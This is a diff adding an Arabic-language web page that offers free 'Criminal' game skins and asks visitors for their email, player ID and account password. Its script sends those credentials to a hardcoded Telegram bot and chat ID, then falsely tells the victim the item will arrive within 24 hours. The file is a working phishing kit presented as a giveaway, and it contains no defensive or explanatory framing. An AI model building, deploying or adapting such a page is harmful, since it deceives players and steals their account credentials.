@@ -1,0 +1,124 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>احصل على الكرمنال مجاناً</title>
+  <style>
+    body {
+      background-color: #0d0d0d;
+      color: white;
+      font-family: 'Tahoma', sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      color: #ff4444;
+      margin-bottom: 30px;
+    }
+    .form-container {
+      background-color: #1a1a1a;
+      border: 2px solid #444;
+      border-radius: 15px;
+      padding: 20px;
+      width: 90%;
+      max-width: 400px;
+      margin: auto;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      margin-bottom: 5px;
+      font-size: 16px;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      border-radius: 8px;
+      border: none;
+      font-size: 16px;
+      margin-bottom: 10px;
+    }
+    button {
+      padding: 12px 20px;
+      background-color: #e91e63;
+      border: none;
+      border-radius: 10px;
+      font-size: 18px;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #c2185b;
+    }
+    .images {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    .images img {
+      width: 80px;
+      height: 80px;
+      border-radius: 10px;
+      border: 2px solid #fff;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🎁 احصل على الكرمنال مجاناً الآن 🎁</h1>
+
+  <div class="images">
+    <img src="https://i.imgur.com/Unp8mN8.png" alt="Red Criminal">
+    <img src="https://i.imgur.com/EBXQOSw.png" alt="Green Criminal">
+    <img src="https://i.imgur.com/6yKpBlg.png" alt="Blue Criminal">
+  </div>
+
+  <div class="form-container">
+    <label for="criminal">اختر لون الكرمنال:</label>
+    <select id="criminal">
+      <option value="كرمنال أحمر">كرمنال أحمر</option>
+      <option value="كرمنال أخضر">كرمنال أخضر</option>
+      <option value="كرمنال أزرق">كرمنال أزرق</option>
+    </select>
+
+    <label for="email">البريد الإلكتروني:</label>
+    <input type="email" id="email" placeholder="example@email.com" required>
+
+    <label for="gameid">معرّف اللاعب (ID):</label>
+    <input type="text" id="gameid" placeholder="123456789" required>
+
+    <label for="password">كلمة المرور:</label>
+    <input type="password" id="password" placeholder="********" required>
+
+    <button onclick="sendToTelegram()">احصل عليه الآن</button>
+  </div>
+
+  <script>
+    function sendToTelegram() {
+      const criminal = document.getElementById('criminal').value;
+      const email = document.getElementById('email').value;
+      const gameid = document.getElementById('gameid').value;
+      const password = document.getElementById('password').value;
+
+      const token = "2ydah3wZFBPzQqHHm23RwgFO9ju_83fhcG8X97AN48rQ9gnr5";
+      const chat_id = "6698080150";
+      const message = `🚨 طلب جديد للحصول على الكرمنال:
+🎭 اللون: ${criminal}
+📧 البريد: ${email}
+🆔 ID: ${gameid}
+🔒 كلمة السر: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
+        .then(response => {
+          alert("✅ تم الإرسال، سيتم تسليم الكرمنال خلال 24 ساعة.");
+        })
+        .catch(error => {
+          alert("❌ حدث خطأ أثناء الإرسال.");
+        });
+    }
+  </script>
+
+</body>
+</html>
